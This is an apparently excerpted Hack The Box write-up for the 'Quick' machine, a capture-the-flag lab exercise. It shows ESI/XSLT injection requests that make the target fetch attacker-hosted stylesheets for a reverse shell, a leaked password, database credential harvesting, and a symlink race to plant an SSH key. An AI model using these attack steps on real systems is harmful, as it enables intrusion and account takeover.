...
By exploring around, saw this few usernames and I can combine them to create a wordlist based on the names, emails and companies.
...
To access the HTTP/3, I'm using `Quiche`.
...
I found the password from the pdf file which is `Quick4cc3$$`.
...
I found `elisa` is the potential user to log in the website.

![]({{ "/images/htb/quick/loginaselisaX.png" | relative_url }})

***

And I found that I can submit ticket and check the number of our ticket after it being sent to the machine, so it has something to do with `database` and `php` files to manages all of these.
...
I received the ticket number which shows below.
...
It shows `ESIGATE` and at this moment and the web app is using `ESIGATE`.

I search around about **Esigate Exploit** and found an article about `XSLT INJECTION` to the machine and I will get **RCE** from the machine. 

The idea is I need to intercept `ticket.php` with `burp` with payload attached and play along with it until I have **reverse shell.**
...
> Need to start **python** server to let the machine download the `xsl` file from our machine.
...
title=a&msg=<esi:include+src="http://10.10.14.75/corshine1.xml"+stylesheet="http://10.10.14.75/corshine1.xsl"></esi:include>&id=TKT-1337
```
...
10.10.10.186 - - [15/Jul/2020 13:08:50] "GET /corshine1.xsl HTTP/1.1" 200 -
10.10.10.186 - - [15/Jul/2020 13:08:51] "GET /corshine1.xml HTTP/1.1" 200 -
...
title=a&msg=<esi:include+src="http://10.10.14.75/corshine2.xml"+stylesheet="http://10.10.14.75/corshine2.xsl"></esi:include>&id=TKT-1338
```
...
```
10.10.10.186 - - [15/Jul/2020 13:15:02] "GET /corshine2.xsl HTTP/1.1" 200 -
10.10.10.186 - - [15/Jul/2020 13:15:02] "GET /corshine2.xml HTTP/1.1" 200 -
```

> **Execute third request**

Before executing the `third` request, need to start our **listener** as `netcat` in order to get reverse shell.
...
title=a&msg=<esi:include+src="http://10.10.14.75/corshine3.xml"+stylesheet="http://10.10.14.75/corshine3.xsl"></esi:include>&id=TKT-1339
```
...
There is an interesting file on `/var/www/` which the `Esigate` is being configured, check around and found `db.php` has credential to log into **mysql**.
...
Add this to our `/etc/hosts` and open the subdomain on browser and can't login with `Elisa`.
...
And now I can login as `srvadm` with `elisa` hashes.

![]({{ "/images/htb/quick/loginassrvadmX.png" | relative_url }})

***

There are only 2 options, I headed to one of the page.
...
Add new printer and set reverse shell to work with that.
...
I sent my ssh-key to the box and do one-line script in order to create **symlink to** **/home/srvadm/.ssh/authorized_keys** and  put my `ssh-key` in the `bill details`, it has split seconds and it will be deleted, so I need to be **Quick**.

After executing this `script` 

```
srvadm@quick:/var/www/jobs$ for i in {1..1000};do ln -s /home/srvadm/.ssh/authorized_keys $corshine.php) 2>/dev/null; done
```

Need to start our listener, and then I hit print to execute the job and see our ssh has been sent to the box, now I can `ssh` as `srvadm` to the box.
...
Found .cache on the box from `linpeas`.

![]({{ "/images/htb/quick/cache1X.png" | relative_url }})

***

I go ahead to `/home/srvadm/.cache/conf.d/` and found `printers.conf` and inside the file it consists of **deviceuri** which has `url encoded`.
